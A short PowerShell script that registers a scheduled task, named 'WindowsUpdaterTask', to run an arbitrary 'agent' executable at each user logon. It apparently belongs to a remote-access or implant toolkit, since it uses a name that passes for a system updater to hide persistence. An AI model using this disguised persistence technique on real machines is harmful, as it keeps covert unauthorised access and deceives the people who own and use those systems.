param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

$taskName = "WindowsUpdaterTask"

# Create scheduled task that runs the agent directly at user logon
try {
    schtasks /create /tn $taskName /tr "\"$agentPath\"" /sc onlogon /ru $env:USERNAME /f /it | Out-Null
    Write-Output "✅ Scheduled task '$taskName' created. Agent will run at next logon."
} catch {
    Write-Output "❌ Failed to create task: $_"
}